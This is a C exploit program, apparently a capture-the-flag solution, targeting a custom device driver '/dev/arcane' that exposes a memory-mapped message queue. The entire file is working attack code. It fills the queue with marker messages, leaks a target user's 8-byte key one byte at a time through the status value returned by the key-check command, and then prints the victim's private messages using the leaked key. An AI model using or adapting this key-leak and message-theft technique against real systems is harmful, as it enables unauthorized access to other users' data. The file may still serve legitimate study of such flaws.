#include <err.h>
#include <fcntl.h>
#include <stddef.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <stdbool.h>
#include <string.h>
#include <unistd.h>
#include <inttypes.h>
#include <sys/mman.h>

#define DEV_NAME "/dev/arcane"

#define CMD_PEEK_MSG 0x00
#define CMD_PUSH_MSG 0x01
#define CMD_POP_MSG 0x02
#define CMD_GEN_KEY 0x03
#define CMD_CHK_KEY 0x04

#define STATUS_OK    0x00000000
#define STATUS_BUSY  0x01000000
#define STATUS_ERROR 0x02000000

#define ERR_INVALID_KEY 0x03

/*
	Used to talk with the mmio module
*/
#define MSG_SZ 0x100

typedef struct __attribute__((packed)) guest_req {
	uint32_t status;
	uint32_t cmd;
	uint32_t mid;
	uint32_t uid;
	uint64_t key;
	char buf[MSG_SZ];
} guest_req_t;

static void fill_msgqueue(volatile guest_req_t *req) {
	uint32_t status;

	req->cmd = CMD_GEN_KEY;
	while ((status = req->status) == STATUS_BUSY) usleep(100);
	if (status != STATUS_OK) {
		printf("[exploit] cmd gen key failed: 0x%" PRIx32 "\n", status);
		exit(1);
	}

	printf("[exploit] got key: 0x%" PRIx64 "\n", req->key);

	req->mid = 63;
	req->uid = getuid();
	req->cmd = CMD_PEEK_MSG;
	while ((status = req->status) == STATUS_BUSY) usleep(100);

	// Already filled up by a previous run
	if (status == STATUS_OK)
		return;

	req->mid = 123;
	strcpy((void *)req->buf, "PWN");

	for (unsigned i = 0; i < 64; i++) {
		req->cmd = CMD_PUSH_MSG;
		while ((status = req->status) == STATUS_BUSY) usleep(100);

		if (status != STATUS_OK) {
			printf("[exploit] cmd push failed: 0x%" PRIx32 "\n", status);
			exit(1);
		}
	}
}

int main(int argc, char **argv) {
	uint8_t key[8] = {0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff};
	uint32_t target_uid, start_idx = 0, end_idx = 0;
	bool success = false;
	volatile guest_req_t *req;
	int fd;

	if (argc < 2) {
		errx(1, "usage: %s uid [msg_idx]\n"
			"\tuid: uid to steal msg from\n"
			"\tmsg_idx: idx of msg to steal",
			argv[0]
		);
	}

	// Open /dev/arcane and mmap our mmio page
	if ((fd = open(DEV_NAME, O_RDWR)) < 0)
		err(1, "open " DEV_NAME);

	req = (guest_req_t *)mmap(NULL, 0x1000, PROT_READ | PROT_WRITE, MAP_SHARED, fd, 0);
	if (req == MAP_FAILED)
		err(1, "mmap");

	target_uid = atoi(argv[1]);
	printf("[exploit] target uid: %" PRIu32 "\n", target_uid);

	if (argc == 3) {
		start_idx = end_idx = atoi(argv[2]);
		printf("[exploit] target msg idx: %" PRIu32 "\n", start_idx);
	} else {
		start_idx = 0;
		end_idx = 63; // there can be at most 64 msgs
		printf("[exploit] no msg idx given, scanning all msgs\n");
	}

	// Fill the message queue with known messages so that we can distinghush
	// whether we successfully stolen a message or not later
	fill_msgqueue(req);

	/*
		Leak target key with CMD_CHK_KEY
	*/
	req->uid = target_uid;

	for (size_t i = 0; i < sizeof(key); i++) {
		uint32_t ret;
		int16_t leak;

		key[i] = 0;
		req->key = *(uint64_t*)&key;
		req->cmd = CMD_CHK_KEY;

		while ((req->status & 0xff000000) == STATUS_BUSY) usleep(100);
		ret = req->status;

		if ((ret & 0xff000000) != STATUS_OK) {
			puts("[exploit] unexpected error");
			break;
		}

		leak = ret & 0xffffff;

		if (leak > 0)
			key[i] = leak;
		else if (leak < 0)
			key[i] = 0;
		else
			break;
	}

	printf("[exploit] leaked key: 0x%" PRIx64 "\n", *(uint64_t*)&key);

	/*
		Peek messages with leaked key
	*/
	req->uid = target_uid;
	req->key = *(uint64_t*)&key;

	for (uint32_t i = start_idx; i <= end_idx; i++) {
		uint32_t status;

		req->mid = i;
		req->cmd = CMD_PEEK_MSG;
		while ((status = req->status) == STATUS_BUSY) usleep(100);

		if ((status & 0xff000000) == STATUS_ERROR) {
			printf("[exploit] cmd peek failed: 0x%" PRIx32 "\n", status);

			if ((status & 0xffffff) == ERR_INVALID_KEY) {
				puts("[exploit] leaked key is invalid");
				return 1;
			}

			break;
		}

		// We scanned all messages or there is no msg at the given idx
		if (!strcmp((char *)req->buf, "PWN"))
			break;

		printf("[exploit] stolen msg at idx %" PRIu32 ": %s\n", i, req->buf);
		success = true;
	}

	if (!success) {
		puts("[exploit] no msgs found");
		return 1;
	}

	return 0;
}
